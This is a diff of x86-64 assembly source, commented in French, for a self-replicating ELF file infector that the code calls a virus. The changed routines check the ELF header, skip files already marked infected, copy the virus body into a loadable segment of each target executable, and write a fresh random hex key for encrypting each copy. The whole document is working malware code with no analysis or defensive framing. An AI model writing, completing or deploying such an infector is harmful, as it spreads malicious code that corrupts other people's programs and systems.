@@ -53,10 +53,11 @@ check_file_integrity:
     mov rdi, [r12 + fileData]
     cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
 	jnz simple
-	mov sil, [rdi + s_support]
-	cmp sil, 1			; cmp 32 bit
+	cmp  byte [rdi + s_support], 1			; cmp 32 bit
 	je simple
-	bit_64:
+    cmp byte [rdi + e_infected], 't'
+    jz close_mmap
+    
     ; check if the file is bigger than an ELF_HEADER_FILE
     xor rax, rax
     mov rsi, [r12 + fileSize]
@@ -126,17 +127,17 @@ phead_loop:
     cmp qword [r12 + pload], 0
     jz close_mmap                    ;on quite si il n'y a pas de pload trouvé
 
-check_pload_signature:
-    mov r13, [r12 + pload]
-    lea rdi, [rel signature]
-    mov rsi, [r12 + fileData]
-    add rsi, [r13 + p_filesz]
-    sub rsi, SIGNATURE_SIZE
-    mov rcx, SIGNATURE_SIZE  
-    repz cmpsb
-    jz close_mmap           ; on quite proprement si il y a deja une signature
-check_pload_size:
+;check_pload_signature:
 ;    mov r13, [r12 + pload]
+;    lea rdi, [rel signature]
+;    mov rsi, [r12 + fileData]
+;    add rsi, [r13 + p_filesz]
+;    sub rsi, SIGNATURE_SIZE
+;    mov rcx, SIGNATURE_SIZE  
+;    repz cmpsb
+;    jz close_mmap           ; on quite proprement si il y a deja une signature
+check_pload_size:
+    mov r13, [r12 + pload]
     mov rax, [r13 + p_filesz]
     add rax, PROG_SIZE
     mov rdi, [r12 + fileSize]
@@ -209,6 +210,7 @@ change_pload_data:
 
 copy_program:
     mov rdi, [r12 + fileData]
+    mov byte [rdi + e_infected], 't'
     add rdi, [r12 + programStart]           ; address to write the programe in the file
     mov rbx, rdi
     lea rsi, [rel main]                     ; address du debut du programe
@@ -233,12 +235,26 @@ change_key:
     mov rdx, GRND_RANDOM
     mov rax, SYS_GETRANDOM
     syscall
-    mov rax, [r12 + virusId]
-    mov [rbx + SIGNATURE_KEY_OFFSET], rax
+    xor rax, rax
+    xor rsi, rsi
+    lea rcx, [r12 + virusId]
+    lea rdx, [rel hexa_nb]
+    lea rdi, [rbx + SIGNATURE_KEY_OFFSET]
+    change_key_loop:
+    mov sil, [rcx]
+    and sil, 15
+    mov sil, [rdx + rsi]
+    mov [rdi], sil
+    mov sil, [rcx]
+    shr sil, 4
+    mov sil, [rdx + rsi]
+    mov [rdi + 1], sil
+    add rdi, 2
+    inc rax
+    inc rcx
+    cmp rax, 12
+    jl change_key_loop
     inc qword [r12 + virusId]
-    lea rdi, [rbx + SIGNATURE_KEY_OFFSET + 8]
-    mov rax, SYS_TIME
-    syscall
 choose_encrypt_type:
     lea rdi, [rbx + ENCRYPT_OFFSET]
     lea rsi, [rbx + KEY_OFFSET]
